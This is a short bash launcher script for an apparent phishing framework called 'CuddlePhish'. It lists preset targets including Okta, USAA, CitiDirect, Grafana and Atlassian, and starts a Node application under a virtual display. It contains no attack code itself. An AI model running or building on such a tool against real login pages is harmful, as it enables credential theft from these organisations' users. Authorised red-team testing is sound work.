#!/bin/bash

# CuddlePhish Startup Script
# This script uses xvfb-run to provide a virtual display for the application

if [ $# -eq 0 ]; then
    echo "Usage: $0 <target>"
    echo "Available targets:"
    echo "  - grafana"
    echo "  - citidirect"
    echo "  - usaa"
    echo "  - okta"
    echo "  - atlassian"
    exit 1
fi

TARGET=$1

echo "Starting CuddlePhish with target: $TARGET"
echo "Using xvfb-run for virtual display..."

# Start the application with xvfb-run
xvfb-run -a -s "-screen 0 1920x1080x24 -ac" node index.js $TARGET 